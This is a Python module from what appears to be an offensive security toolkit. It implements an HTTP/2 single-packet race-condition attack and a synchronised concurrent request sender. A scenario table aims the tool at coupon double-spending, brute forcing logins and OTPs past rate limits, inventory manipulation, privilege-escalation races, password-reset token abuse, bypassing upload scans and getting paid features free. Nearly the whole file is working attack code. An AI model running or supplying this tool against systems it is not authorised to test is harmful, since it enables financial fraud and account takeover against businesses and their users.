"""
TeamCyberOps Suite v4 — Race Condition Tester
Single-packet HTTP/2 attack + concurrent request sender
Detects: Double-spend, coupon reuse, rate-limit bypass, price manipulation
"""
import socket, ssl, struct, threading, time, queue, json
import urllib.request, urllib.parse
from pathlib import Path
from datetime import datetime

BASE_DIR = Path(__file__).parent.parent.parent
LOGS_DIR = BASE_DIR / "logs"
LOGS_DIR.mkdir(exist_ok=True)


# ══════════════════════════════════════════════════════════════
#  HTTP/2 SINGLE-PACKET ATTACK (Last Byte Sync)
# ══════════════════════════════════════════════════════════════

def _build_h2_preface() -> bytes:
    return b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


def _build_h2_settings() -> bytes:
    # SETTINGS frame: type=0x4, flags=0, stream_id=0
    return struct.pack(">I", 0)[1:] + b"\x04\x00" + struct.pack(">I", 0) + b""


def _hpack_encode_headers(headers: list) -> bytes:
    """Minimal HPACK encoding (literal, no indexing)."""
    result = b""
    for name, value in headers:
        n = name.encode() if isinstance(name, str) else name
        v = value.encode() if isinstance(value, str) else value
        result += b"\x00"  # literal not indexed
        result += bytes([len(n)]) + n
        result += bytes([len(v)]) + v
    return result


def _build_h2_headers_frame(stream_id: int, headers: list,
                              end_stream: bool = True) -> bytes:
    hpack  = _hpack_encode_headers(headers)
    length = len(hpack)
    flags  = 0x04 | (0x01 if end_stream else 0x00)  # END_HEADERS + END_STREAM?
    frame  = struct.pack(">I", length)[1:]  # 3 bytes length
    frame += bytes([0x01, flags])           # type=HEADERS, flags
    frame += struct.pack(">I", stream_id)   # 4 bytes stream_id
    frame += hpack
    return frame


def _build_h2_data_frame(stream_id: int, data: bytes, end_stream: bool = True) -> bytes:
    flags  = 0x01 if end_stream else 0x00
    length = len(data)
    frame  = struct.pack(">I", length)[1:]
    frame += bytes([0x00, flags])
    frame += struct.pack(">I", stream_id)
    frame += data
    return frame


class SinglePacketAttack:
    """
    HTTP/2 Single-Packet Race Condition Attack.
    Sends N requests in a SINGLE TCP packet for true synchronization.
    Based on James Kettle's research (PortSwigger).
    """
    def __init__(self, host: str, port: int = 443, use_tls: bool = True):
        self.host    = host
        self.port    = port
        self.use_tls = use_tls
        self.sock    = None

    def connect(self) -> bool:
        try:
            raw = socket.create_connection((self.host, self.port), timeout=10)
            if self.use_tls:
                ctx = ssl.create_default_context()
                ctx.set_alpn_protocols(["h2"])
                self.sock = ctx.wrap_socket(raw, server_hostname=self.host)
                # Verify H2 negotiated
                if self.sock.selected_alpn_protocol() != "h2":
                    self.sock = raw  # fallback
            else:
                self.sock = raw
            # Send H2 preface + SETTINGS
            self.sock.sendall(_build_h2_preface())
            self.sock.sendall(struct.pack(">I", 0)[1:] + b"\x04\x00" +
                              struct.pack(">I", 0))
            return True
        except Exception:
            return False

    def send_parallel_requests(self, requests: list) -> list:
        """
        requests = list of (path, method, headers, body)
        Returns: list of (stream_id, status_code, response_time)
        """
        if not self.sock: return []
        all_frames = b""
        stream_id  = 1
        start_times = {}

        for (path, method, extra_headers, body) in requests:
            headers = [
                (":method",    method.upper()),
                (":path",      path),
                (":scheme",    "https" if self.use_tls else "http"),
                (":authority", self.host),
                ("content-type", "application/json"),
            ] + [(k, v) for k, v in (extra_headers or {}).items()]

            body_bytes = body.encode() if isinstance(body, str) else (body or b"")
            # HEADERS frame (no END_STREAM if has body)
            all_frames += _build_h2_headers_frame(
                stream_id, headers, end_stream=not body_bytes)
            if body_bytes:
                all_frames += _build_h2_data_frame(
                    stream_id, body_bytes, end_stream=True)
            start_times[stream_id] = time.time()
            stream_id += 2  # odd stream IDs for client

        # Send everything in ONE packet
        try:
            self.sock.sendall(all_frames)
        except Exception as e:
            return [{"error": str(e)}]

        # Read responses
        results = []
        timeout = time.time() + 10
        responses_needed = len(requests)
        buf = b""
        while len(results) < responses_needed and time.time() < timeout:
            try:
                self.sock.settimeout(2)
                chunk = self.sock.recv(4096)
                if not chunk: break
                buf += chunk
                # Parse H2 frames (minimal)
                while len(buf) >= 9:
                    f_len   = struct.unpack(">I", b"\x00" + buf[0:3])[0]
                    f_type  = buf[3]
                    f_flags = buf[4]
                    f_sid   = struct.unpack(">I", buf[5:9])[0] & 0x7FFFFFFF
                    if len(buf) < 9 + f_len: break
                    f_data  = buf[9:9 + f_len]
                    buf     = buf[9 + f_len:]
                    if f_type == 0x01:  # HEADERS
                        rt = (time.time() - start_times.get(f_sid, time.time())) * 1000
                        results.append({"stream": f_sid, "response_ms": rt,
                                        "type": "headers"})
            except Exception:
                break
        return results

    def close(self):
        if self.sock:
            try: self.sock.close()
            except Exception: pass


# ══════════════════════════════════════════════════════════════
#  CONCURRENT REQUEST SENDER (HTTP/1.1 fallback)
# ══════════════════════════════════════════════════════════════

class ConcurrentRaceTester:
    """Send N concurrent requests to detect race conditions."""

    def __init__(self, url: str, method: str = "POST",
                 headers: dict = None, body: str = ""):
        self.url     = url
        self.method  = method.upper()
        self.headers = headers or {}
        self.body    = body
        self.results = []
        self._lock   = threading.Lock()

    def _send_one(self, idx: int, barrier: threading.Barrier):
        """Send a single request, synchronized with barrier."""
        start = None
        try:
            # Wait for all threads to be ready
            barrier.wait(timeout=5)
            start = time.time()
            data  = self.body.encode() if self.body else None
            req   = urllib.request.Request(
                self.url, data=data, method=self.method)
            req.add_header("User-Agent", "TeamCyberOps-RaceTest/1.0")
            for k, v in self.headers.items():
                req.add_header(k, v)
            if data:
                req.add_header("Content-Type", "application/json")
            with urllib.request.urlopen(req, timeout=10) as resp:
                elapsed  = (time.time() - start) * 1000
                body_txt = resp.read(500).decode("utf-8", errors="replace")
                with self._lock:
                    self.results.append({
                        "idx":         idx,
                        "status":      resp.status,
                        "elapsed_ms":  round(elapsed, 1),
                        "body":        body_txt[:200],
                    })
        except urllib.error.HTTPError as e:
            elapsed = (time.time() - (start or time.time())) * 1000
            body_txt = e.read(200).decode("utf-8", errors="replace")
            with self._lock:
                self.results.append({
                    "idx": idx, "status": e.code,
                    "elapsed_ms": round(elapsed, 1),
                    "body": body_txt[:200],
                })
        except Exception as e:
            with self._lock:
                self.results.append({"idx": idx, "error": str(e)})

    def run(self, n_requests: int = 20, log_cb=None) -> dict:
        """Run N concurrent requests simultaneously."""
        self.results = []
        barrier    = threading.Barrier(n_requests)
        threads    = []
        start_wall = time.time()

        for i in range(n_requests):
            t = threading.Thread(target=self._send_one,
                                  args=(i, barrier), daemon=True)
            threads.append(t)
        for t in threads: t.start()
        for t in threads: t.join(timeout=15)

        elapsed_total = (time.time() - start_wall) * 1000
        # Analyze results
        statuses    = [r.get("status", 0) for r in self.results]
        bodies      = [r.get("body", "") for r in self.results]
        unique_stas = set(statuses)
        # Detect potential race condition wins
        success_count = sum(1 for s in statuses if s in (200, 201))

        analysis = {
            "total_sent":    n_requests,
            "responses":     len(self.results),
            "status_counts": {str(s): statuses.count(s) for s in unique_stas},
            "success_count": success_count,
            "elapsed_ms":    round(elapsed_total, 1),
            "results":       sorted(self.results, key=lambda x: x.get("idx",0)),
        }

        # Look for race wins
        if success_count > 1:
            analysis["race_detected"] = True
            analysis["severity"]      = "CRITICAL"
            analysis["message"]       = (f"🔴 RACE CONDITION! {success_count}/{n_requests} "
                                          f"requests succeeded simultaneously!")
        elif len(unique_stas) > 1 and n_requests >= 5:
            analysis["race_possible"] = True
            analysis["message"]       = "⚠ Mixed responses — possible race condition"
        else:
            analysis["message"] = "No obvious race condition detected"

        return analysis


# ══════════════════════════════════════════════════════════════
#  RACE CONDITION SCENARIOS
# ══════════════════════════════════════════════════════════════

RACE_SCENARIOS = {
    "Double Spend / Coupon Reuse": {
        "description": "Apply same coupon/gift card multiple times simultaneously",
        "high_value":  True,
        "method":      "POST",
        "note":        "Body: {'coupon_code':'SAVE50'} — try 20+ concurrent requests",
        "impact":      "Free products, negative balance, financial loss to company",
    },
    "Rate Limit Bypass": {
        "description": "Bypass login/OTP brute-force protection",
        "high_value":  True,
        "method":      "POST",
        "note":        "Body: {'username':'admin','password':'TEST'} — send 50+ concurrent",
        "impact":      "Brute force login, OTP bypass, account takeover",
    },
    "Inventory Manipulation": {
        "description": "Buy more stock than available (negative inventory)",
        "high_value":  True,
        "method":      "POST",
        "note":        "Body: {'item_id':1,'qty':1} — send 10+ concurrent when qty=1",
        "impact":      "Free products, inventory bypass",
    },
    "Privilege Escalation Race": {
        "description": "TOCTOU on permission check during role change",
        "high_value":  True,
        "method":      "POST",
        "note":        "Race: trigger admin action while permission being revoked",
        "impact":      "Unauthorized access, privilege escalation",
    },
    "Password Reset Token Race": {
        "description": "Request multiple password reset tokens simultaneously",
        "high_value":  False,
        "method":      "POST",
        "note":        "Body: {'email':'victim@example.com'} — check if multiple tokens valid",
        "impact":      "Account takeover if old tokens not invalidated",
    },
    "File Upload Race": {
        "description": "Race between upload and security scan/validation",
        "high_value":  False,
        "method":      "POST",
        "note":        "Upload malicious file + immediately access it before scan completes",
        "impact":      "RCE via bypassing malware scan",
    },
    "Free Premium Upgrade": {
        "description": "Race between payment verification and feature activation",
        "high_value":  True,
        "method":      "POST",
        "note":        "Initiate payment + cancel + access premium simultaneously",
        "impact":      "Free premium access",
    },
    "Token Budget Exhaustion": {
        "description": "Consume credits/tokens faster than balance check allows",
        "high_value":  True,
        "method":      "POST",
        "note":        "Send API requests concurrently when balance=1",
        "impact":      "Negative balance, free API usage",
    },
}


def get_scenarios() -> dict:
    return RACE_SCENARIOS


def save_result(target: str, scenario: str, result: dict,
                proj_dir: Path = None):
    """Save race condition test result."""
    out_dir = proj_dir or (LOGS_DIR / "race_conditions")
    out_dir.mkdir(parents=True, exist_ok=True)
    fname = f"race_{scenario.replace(' ','_')[:30]}_{int(time.time())}.json"
    with open(out_dir / fname, 'w') as f:
        json.dump({"target": target, "scenario": scenario,
                   "result": result,
                   "timestamp": datetime.now().isoformat()}, f, indent=2)
    return str(out_dir / fname)
